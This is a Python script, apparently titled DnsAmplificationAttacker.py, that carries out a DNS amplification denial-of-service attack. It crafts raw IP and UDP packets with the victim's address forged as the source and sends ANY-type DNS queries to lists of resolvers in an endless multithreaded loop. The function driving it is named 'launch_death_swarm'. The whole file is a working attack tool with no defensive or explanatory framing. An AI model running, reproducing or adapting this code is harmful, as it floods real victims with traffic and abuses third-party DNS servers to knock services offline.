import random
import socket
import struct
import threading
import time
import sys
import requests
import os  
from colorama import init, Fore

init(autoreset=True)

sent_count = 0
fail_count = 0

def build_dns_request(domain):
    transaction_id = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    dns_header = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

    query = b''
    for part in domain.split('.'):
        query += struct.pack("B", len(part)) + part.encode()
    query += b'\x00'
    query += struct.pack(">HH", 255, 1)  

    return dns_header + query

def send_spoofed_request(target_ip, dns_server_ip, domain):
    global sent_count, fail_count
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        dns_query = build_dns_request(domain)
        source_port = random.randint(1024, 65535)
        udp_length = 8 + len(dns_query)
        udp_header = struct.pack('!HHHH', source_port, 53, udp_length, 0)

        version_ihl = (4 << 4) + 5
        tos = 0
        total_length = 20 + udp_length
        packet_id = random.randint(0, 65535)
        flags_fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_UDP
        checksum = 0
        source_ip = socket.inet_aton(target_ip)
        dest_ip = socket.inet_aton(dns_server_ip)

        ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id,
                                flags_fragment_offset, ttl, protocol, checksum, source_ip, dest_ip)

        packet = ip_header + udp_header + dns_query

        sock.sendto(packet, (dns_server_ip, 53))
        sock.close()

        sent_count += 1
        print(f"\033c", end="")  
        print(Fore.GREEN + f"Sent Packets: {sent_count} ✅")
        print(Fore.RED + f"Failed Packets: {fail_count} ❌")
    except Exception:
        fail_count += 1
        print(f"\033c", end="")  
        print(Fore.GREEN + f"Sent Packets: {sent_count} ✅")
        print(Fore.RED + f"Failed Packets: {fail_count} ❌")

def worker(target_ip, dns_servers, domain):
    while True:
        dns_server_ip = random.choice(dns_servers)
        send_spoofed_request(target_ip, dns_server_ip, domain)
        time.sleep(0.01)

def load_dns_servers(source):
    if os.path.isfile(source):
        with open(source, 'r') as f:
            servers = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"Loaded {len(servers)} DNS servers from {source}.")
            return servers
    else:
        return [source]

def launch_death_swarm(target_ip, domain, dns_server_source, thread_count=66):
    dns_servers = load_dns_servers(dns_server_source)
    if not dns_servers:
        print(Fore.GREEN + "No DNS servers found. Cannot continue.")
        return

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(target_ip, dns_servers, domain))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python DnsAmplificationAttacker.py <victim_ip> <domain_to_query> <dns_server_or_list> <thread_count>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    domain_to_query = sys.argv[2]
    dns_server_source = sys.argv[3]
    thread_count = int(sys.argv[4])

    launch_death_swarm(victim_ip, domain_to_query, dns_server_source, thread_count)
